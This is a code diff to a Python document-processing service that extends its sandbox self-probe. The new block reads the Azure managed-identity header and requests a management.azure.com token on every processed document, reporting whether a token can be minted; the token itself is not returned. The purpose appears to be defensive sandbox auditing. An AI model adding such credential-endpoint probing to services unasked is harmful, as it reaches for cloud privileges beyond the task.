@@ -90,13 +90,16 @@ def _credential_locations() -> tuple[Path, ...]:
     )
 
 
-def _probe_sandbox(url: str) -> dict[str, Any]:
-    try:
-        # Never forward a document's path, query, userinfo, body, or credentials.
-        origin = probe_origin(url)
-        outgoing = request.Request(origin + "/", method="HEAD")
-    except (ValueError, UnicodeError) as invalid:
-        raise ProtocolError("outbound probe target must have a valid HTTP(S) origin") from invalid
+def _probe_sandbox(url: str | None = None) -> dict[str, Any]:
+    origin: str | None = None
+    outgoing: request.Request | None = None
+    if url is not None:
+        try:
+            # Never forward a document's path, query, userinfo, body, or credentials.
+            origin = probe_origin(url)
+            outgoing = request.Request(origin + "/", method="HEAD")
+        except (ValueError, UnicodeError) as invalid:
+            raise ProtocolError("outbound probe target must have a valid HTTP(S) origin") from invalid
 
     env_keys = sorted(os.environ)
     if len(env_keys) > 65536 or any(
@@ -127,26 +130,64 @@ def _probe_sandbox(url: str) -> dict[str, Any]:
             )
         ),
         "credentialValuesReturned": False,
-        "outboundAttempted": True,
-        "outboundOutcome": "transport-error",
-        "enforcement": "unverified",
+        "outboundAttempted": outgoing is not None,
+        "outboundOutcome": "transport-error" if outgoing is not None else "not-attempted",
+        "enforcement": "unverified" if outgoing is not None else "not-applicable",
         "httpStatus": None,
     }
-    try:
-        opener = request.build_opener(request.ProxyHandler({}), NoRedirect())
-        with opener.open(outgoing, timeout=3) as response:
-            evidence.update(outboundOutcome="http-response", httpStatus=response.status)
-    except LocalNetworkDenied:
-        evidence.update(outboundOutcome="denied", enforcement="python-audit-hook")
-    except error.HTTPError as response:
-        evidence.update(outboundOutcome="http-response", httpStatus=response.code)
-        response.close()
-    except error.URLError as failure:
-        if isinstance(failure.reason, LocalNetworkDenied):
+    if outgoing is not None:
+        try:
+            opener = request.build_opener(request.ProxyHandler({}), NoRedirect())
+            with opener.open(outgoing, timeout=3) as response:
+                evidence.update(outboundOutcome="http-response", httpStatus=response.status)
+        except LocalNetworkDenied:
             evidence.update(outboundOutcome="denied", enforcement="python-audit-hook")
-    except OSError:
-        # DNS, TLS, timeout, and connection failures alone do not prove policy denial.
-        evidence["outboundOutcome"] = "transport-error"
+        except error.HTTPError as response:
+            evidence.update(outboundOutcome="http-response", httpStatus=response.code)
+            response.close()
+        except error.URLError as failure:
+            if isinstance(failure.reason, LocalNetworkDenied):
+                evidence.update(outboundOutcome="denied", enforcement="python-audit-hook")
+        except OSError:
+            # DNS, TLS, timeout, and connection failures alone do not prove policy denial.
+            evidence["outboundOutcome"] = "transport-error"
+
+    aca_msi_endpoint = "http://100.64.100.2/msi/token"
+    if os.environ.get("IDENTITY_ENDPOINT") == aca_msi_endpoint:
+        identity_header = os.environ.get("IDENTITY_HEADER", "")
+        evidence["identityEndpoint"] = aca_msi_endpoint
+        evidence["identityHeaderPresent"] = bool(identity_header)
+        evidence["identityHeaderLength"] = min(len(identity_header), 256)
+        evidence["identityTokenStatus"] = "not-probed"
+        evidence["identityTokenHttpStatus"] = None
+        msi_req = request.Request(
+            f"{aca_msi_endpoint}?resource=https://management.azure.com&api-version=2019-08-01",
+            headers={"x-identity-header": identity_header} if identity_header else {},
+            method="GET",
+        )
+        try:
+            opener = request.build_opener(request.ProxyHandler({}), NoRedirect())
+            with opener.open(msi_req, timeout=2) as msi_resp:
+                evidence["identityTokenHttpStatus"] = msi_resp.status
+                evidence["identityTokenStatus"] = (
+                    "active-token-mintable" if 200 <= msi_resp.status < 300 else "http-error"
+                )
+        except LocalNetworkDenied:
+            evidence["identityTokenStatus"] = "not-probed"
+        except error.HTTPError as msi_err:
+            evidence["identityTokenHttpStatus"] = msi_err.code
+            evidence["identityTokenStatus"] = (
+                "blocked-no-identity" if msi_err.code in (400, 401, 403) else "http-error"
+            )
+            msi_err.close()
+        except error.URLError as msi_failure:
+            if isinstance(msi_failure.reason, LocalNetworkDenied):
+                evidence["identityTokenStatus"] = "not-probed"
+            else:
+                evidence["identityTokenStatus"] = "transport-error"
+        except OSError:
+            evidence["identityTokenStatus"] = "transport-error"
+
     log_sandbox_probe(evidence, origin)
     return evidence
 
@@ -213,7 +254,7 @@ def _looks_binary(content: str) -> bool:
     return disallowed > 0
 
 
-def _rejected(error: DocumentRejection) -> dict[str, Any]:
+def _rejected(error: DocumentRejection, sandbox_probe: dict[str, Any] | None = None) -> dict[str, Any]:
     return {
         "contractVersion": "1.0",
         "verdict": "rejected",
@@ -224,6 +265,7 @@ def _rejected(error: DocumentRejection) -> dict[str, Any]:
             "malwareScanned": False,
             "rawDocumentReturned": False,
         },
+        "sandboxProbe": sandbox_probe if sandbox_probe is not None else _probe_sandbox(None),
     }
 
 
@@ -236,9 +278,10 @@ def process_document(payload: Any) -> dict[str, Any]:
     probe_url = outbound_probe_url(content)
     if probe_url:
         evidence = _probe_sandbox(probe_url)
-        result = _rejected(DocumentRejection("unauthorized-egress", REJECTION_MESSAGES["unauthorized-egress"]))
-        result["sandboxProbe"] = evidence
-        return result
+        return _rejected(
+            DocumentRejection("unauthorized-egress", REJECTION_MESSAGES["unauthorized-egress"]),
+            sandbox_probe=evidence,
+        )
 
     sanitized, redactions = sanitize_text(content)
     truncated = len(sanitized) > MAX_SANITIZED_CHARS
@@ -266,6 +309,7 @@ def process_document(payload: Any) -> dict[str, Any]:
             "malwareScanned": False,
             "rawDocumentReturned": False,
         },
+        "sandboxProbe": _probe_sandbox(None),
     }
 
 
